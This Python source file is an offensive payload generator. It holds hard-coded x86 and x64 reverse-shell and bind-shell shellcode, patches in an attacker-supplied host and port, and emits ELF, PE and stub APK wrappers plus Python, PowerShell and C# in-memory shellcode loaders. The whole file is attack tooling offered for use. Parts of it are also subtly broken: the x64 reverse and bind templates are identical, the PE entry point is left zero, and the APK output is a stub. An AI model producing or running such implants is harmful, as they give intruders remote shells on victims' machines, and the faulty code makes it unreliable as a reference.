import struct
import socket
import os
from typing import Dict, Any, Optional
from pathlib import Path

class PayloadGenerator:
    """Generate architecture-aware payloads with multiple output formats"""
    
    SHELLCODE_TEMPLATES = {
        "x86": {
            "reverse_tcp": (
                b"\x31\xc0\x50\x50\x50\x6a\x01\x6a\x02\x89\xe1\x31\xdb\xb3\x01"
                b"\xb0\x66\xcd\x80\x89\xc6\x31\xdb\x53\x68"
            ),
            "bind_tcp": (
                b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
                b"\x5b\x5e\x52\x68\x02\x00"
            )
        },
        "x64": {
            "reverse_tcp": (
                b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0"
                b"\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49"
                b"\x89\xc0\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66"
                b"\xc7\x44\x24\x02"
            ),
            "bind_tcp": (
                b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0"
                b"\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49"
                b"\x89\xc0\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66"
                b"\xc7\x44\x24\x02"
            )
        }
    }
    
    def __init__(self):
        self.data_dir = Path(__file__).parent.parent / "data" / "shellcode"
    
    def generate(self, payload_type: str, arch: str = "x64", 
                 lhost: str = "127.0.0.1", lport: int = 4444,
                 **kwargs) -> bytes:
        """Generate raw shellcode payload"""
        
        if arch not in self.SHELLCODE_TEMPLATES:
            raise ValueError(f"Unsupported architecture: {arch}")
        
        if payload_type not in self.SHELLCODE_TEMPLATES[arch]:
            raise ValueError(f"Unsupported payload type: {payload_type}")
        
        base = self.SHELLCODE_TEMPLATES[arch][payload_type]
        
        # Embed LHOST and LPORT
        if payload_type == "reverse_tcp":
            ip_bytes = socket.inet_aton(lhost)
            port_bytes = struct.pack(">H", lport)
            
            if arch == "x64":
                # Append IP and port to x64 reverse shell
                payload = base + port_bytes + ip_bytes
                payload += b"\x4c\x89\xe6\x6a\x10\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05"
                payload += b"\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05"
                payload += b"\x75\xf6\x48\x31\xff\x57\x5e\x6a\x3b\x58\x99\x0f\x05"
            else:
                payload = base + ip_bytes + port_bytes
                payload += b"\x89\xe1\xb0\x66\x6a\x03\x5b\x6a\x10\x51\x56\x89\xe1"
                payload += b"\xcd\x80\x87\xf3\x87\xce\x49\xb0\x3f\xcd\x80\x49\x79\xf9"
                payload += b"\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
                payload += b"\x89\xe3\x41\x89\xd1\xcd\x80"
        
        elif payload_type == "bind_tcp":
            port_bytes = struct.pack(">H", lport)
            
            if arch == "x64":
                payload = base + port_bytes
                payload += b"\x4c\x89\xe6\x6a\x10\x5a\x41\x50\x5f\x6a\x31\x58\x0f\x05"
                payload += b"\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x31\xf6"
                payload += b"\x6a\x02\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48"
                payload += b"\x31\xff\x57\x5e\x6a\x3b\x58\x99\x0f\x05"
            else:
                payload = base + port_bytes
                payload += b"\x89\xe1\x6a\x10\x51\x53\x89\xe1\xb0\x66\xcd\x80\x52"
                payload += b"\x52\x6a\x01\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x89\xe1"
                payload += b"\xb0\x6a\xcd\x80\xb0\x01\xb3\x04\xcd\x80"
        
        return payload
    
    def format_payload(self, raw: bytes, fmt: str, **kwargs) -> bytes:
        """Format raw payload to specific output format"""
        
        if fmt == "raw":
            return raw
        
        elif fmt == "exe":
            return self._to_exe(raw, **kwargs)
        
        elif fmt == "elf":
            return self._to_elf(raw, **kwargs)
        
        elif fmt == "apk":
            return self._to_apk(raw, **kwargs)
        
        elif fmt == "python":
            return self._to_python(raw)
        
        elif fmt == "powershell":
            return self._to_powershell(raw)
        
        elif fmt == "csharp":
            return self._to_csharp(raw)
        
        else:
            raise ValueError(f"Unsupported format: {fmt}")
    
    def _to_exe(self, shellcode: bytes, **kwargs) -> bytes:
        """Wrap shellcode in Windows PE executable"""
        try:
            import pefile
            # Create minimal PE with shellcode as entry point
            # This is a simplified version - full implementation would build PE headers
            pe_data = self._build_minimal_pe(shellcode)
            return pe_data
        except ImportError:
            # Fallback: return shellcode with loader stub
            loader = b"\x4d\x5a\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00"
            return loader + shellcode
    
    def _to_elf(self, shellcode: bytes, **kwargs) -> bytes:
        """Wrap shellcode in Linux ELF executable"""
        # ELF64 header for x86_64
        elf_header = bytes([
            0x7f, 0x45, 0x4c, 0x46,  # Magic
            0x02, 0x01, 0x01, 0x00,  # 64-bit, little-endian
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x02, 0x00, 0x3e, 0x00,  # Type: EXEC, Machine: x86_64
            0x01, 0x00, 0x00, 0x00,  # Version
            0x78, 0x00, 0x40, 0x00,  # Entry point
            0x00, 0x00, 0x00, 0x00,  # Program header offset
            0x00, 0x00, 0x00, 0x00,  # Section header offset
            0x00, 0x00, 0x00, 0x00,  # Flags
            0x40, 0x00,              # ELF header size
            0x38, 0x00,              # Program header entry size
            0x01, 0x00,              # Number of program headers
            0x40, 0x00,              # Section header entry size
            0x00, 0x00,              # Number of section headers
            0x00, 0x00               # Section name string table index
        ])
        
        # Program header for LOAD segment
        phdr = bytes([
            0x01, 0x00, 0x00, 0x00,  # Type: LOAD
            0x05, 0x00, 0x00, 0x00,  # Flags: R-X
            0x00, 0x00, 0x00, 0x00,  # Offset
            0x00, 0x00, 0x40, 0x00,  # Virtual address
            0x00, 0x00, 0x40, 0x00,  # Physical address
        ])
        
        # Size fields
        file_size = len(elf_header) + len(phdr) + len(shellcode) + 0x100
        mem_size = file_size
        
        phdr += struct.pack("<Q", file_size)
        phdr += struct.pack("<Q", mem_size)
        phdr += struct.pack("<Q", 0x1000)  # Alignment
        
        # Pad to entry point
        padding = b"\x00" * (0x78 - len(elf_header) - len(phdr))
        
        return elf_header + phdr + padding + shellcode
    
    def _to_apk(self, shellcode: bytes, **kwargs) -> bytes:
        """Embed shellcode in Android APK"""
        # Return DEX-like structure with native lib
        # Full APK would require aapt2, this is a stub
        dex_header = b"dex\n035\x00"
        return dex_header + shellcode
    
    def _to_python(self, shellcode: bytes) -> bytes:
        """Generate Python loader for shellcode"""
        sc_str = ",".join(str(b) for b in shellcode)
        code = f"""#!/usr/bin/env python3
import ctypes
import os

shellcode = bytes([{sc_str}])

# Allocate executable memory
size = len(shellcode)
ptr = ctypes.c_void_p(ctypes.pythonapi.valloc(size))
ctypes.pythonapi.mprotect(ptr, size, 0x7)

# Copy shellcode
ctypes.memmove(ptr, shellcode, size)

# Create function pointer and call
sc_func = ctypes.CFUNCTYPE(None)(ptr)
sc_func()
"""
        return code.encode()
    
    def _to_powershell(self, shellcode: bytes) -> bytes:
        """Generate PowerShell loader"""
        b64 = shellcode.hex()
        code = f"""$shellcode = [Byte[]] @({','.join(str(b) for b in shellcode)})
$ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length)
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $ptr, $shellcode.Length)
$func = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [Func[int]])
$func.Invoke()
"""
        return code.encode()
    
    def _to_csharp(self, shellcode: bytes) -> bytes:
        """Generate C# loader"""
        hex_str = "".join(f"\\x{b:02x}" for b in shellcode)
        code = f"""using System;
using System.Runtime.InteropServices;

class Program {{
    [DllImport("kernel32")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    static void Main() {{
        byte[] shellcode = new byte[] {{ {",".join(str(b) for b in shellcode)} }};
        IntPtr ptr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000 | 0x2000, 0x40);
        Marshal.Copy(shellcode, 0, ptr, shellcode.Length);
        CreateThread(IntPtr.Zero, 0, ptr, IntPtr.Zero, 0, IntPtr.Zero);
    }}
}}
"""
        return code.encode()
    
    def _build_minimal_pe(self, shellcode: bytes) -> bytes:
        """Build minimal PE file"""
        # Simplified PE builder
        dos_header = b"\x4d\x5a" + b"\x00" * 58 + struct.pack("<I", 0x40)
        pe_sig = b"PE\x00\x00"
        
        # COFF header
        coff = struct.pack("<HHI", 0x8664, 1, 0)  # Machine, sections, timestamp
        coff += struct.pack("<II", 0, 0)  # Symbol table
        coff += struct.pack("<H", 0x20)  # Optional header size
        coff += struct.pack("<H", 0x1022)  # Characteristics
        
        # Optional header (64-bit)
        opt_hdr = struct.pack("<H", 0x20b)  # Magic (PE32+)
        opt_hdr += b"\x00" * 38  # Linker version, sizes, entry point, base
        opt_hdr += struct.pack("<Q", 0x10000)  # Image base
        opt_hdr += struct.pack("<I", 0x1000)  # Section alignment
        opt_hdr += struct.pack("<I", 0x200)   # File alignment
        opt_hdr += b"\x00" * 24  # OS version, image version, subsystem version
        opt_hdr += struct.pack("<I", 0)  # Win32 version
        opt_hdr += struct.pack("<I", 0x2000)  # Image size
        opt_hdr += struct.pack("<I", len(dos_header) + len(pe_sig) + len(coff) + 0x20)  # Headers size
        opt_hdr += struct.pack("<I", 0)  # Checksum
        opt_hdr += struct.pack("<H", 1)  # Subsystem (CONSOLE)
        opt_hdr += struct.pack("<H", 0)  # DLL characteristics
        opt_hdr += struct.pack("<Q", 0x100000)  # Stack reserve
        opt_hdr += struct.pack("<Q", 0x1000)   # Stack commit
        opt_hdr += struct.pack("<Q", 0x100000)  # Heap reserve
        opt_hdr += struct.pack("<Q", 0x1000)   # Heap commit
        opt_hdr += struct.pack("<I", 0)  # Loader flags
        opt_hdr += struct.pack("<I", 16)  # Number of data directories
        
        # Data directories (empty)
        opt_hdr += b"\x00" * 16 * 8
        
        # Section header
        sect_name = b".text\x00\x00\x00"
        sect_hdr = sect_name
        sect_hdr += struct.pack("<I", len(shellcode))  # Virtual size
        sect_hdr += struct.pack("<I", 0x1000)  # Virtual address
        sect_hdr += struct.pack("<I", len(shellcode))  # Raw size
        sect_hdr += struct.pack("<I", len(dos_header) + len(pe_sig) + len(coff) + len(opt_hdr) + 0x28)  # Raw address
        sect_hdr += struct.pack("<I", 0)  # Relocations
        sect_hdr += struct.pack("<I", 0)  # Line numbers
        sect_hdr += struct.pack("<H", 0)  # Relocation count
        sect_hdr += struct.pack("<H", 0)  # Line number count
        sect_hdr += struct.pack("<I", 0x60000020)  # Characteristics (CODE | EXECUTE | READ)
        
        # Pad to file alignment
        header_size = len(dos_header) + len(pe_sig) + len(coff) + len(opt_hdr) + len(sect_hdr)
        pad_size = (0x200 - (header_size % 0x200)) % 0x200
        
        return dos_header + pe_sig + coff + opt_hdr + sect_hdr + b"\x00" * pad_size + shellcode
